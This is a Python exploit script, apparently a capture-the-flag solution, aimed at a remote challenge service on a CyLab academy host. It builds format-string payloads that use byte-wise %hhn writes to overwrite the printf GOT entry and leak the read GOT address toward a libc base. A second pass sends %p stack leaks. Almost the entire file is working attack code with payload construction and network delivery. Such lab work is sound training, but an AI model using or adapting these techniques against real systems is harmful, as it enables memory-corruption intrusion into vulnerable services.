import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    pos = [42 + i for i in range(len(addrs))]
    for _ in range(10):
        fmt = b""
        cur = c0
        for i, (v, off) in enumerate(order):
            need = (v - cur) % 256
            if need == 0:
                need = 256
            cur += need
            fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
        if leak_addr is not None:
            fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
        b, newpos = buildB(fmt, addrs)
        if newpos == pos:
            return b, newpos
        pos = newpos
    return b, pos


def recv_all(s, t):
    time.sleep(t)
    out = b""
    try:
        while True:
            c = s.recv(1 << 16)
            if not c:
                break
            out += c
    except Exception:
        pass
    return out


s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(6)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
b1, _ = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
s.sendall(b"-1\n"); time.sleep(0.2)
s.sendall(b1 + b"\n")
o1 = recv_all(s, 1.2)
print("passe1:", len(o1))
# B2 inoffensif : juste des %p
b2 = b"1.MARK.%52$p.%53$p.%54$p"
s.sendall(b2 + b"\n")
o2 = recv_all(s, 1.5)
print("passe2:", len(o2), repr(o2[:400]))
s.close()
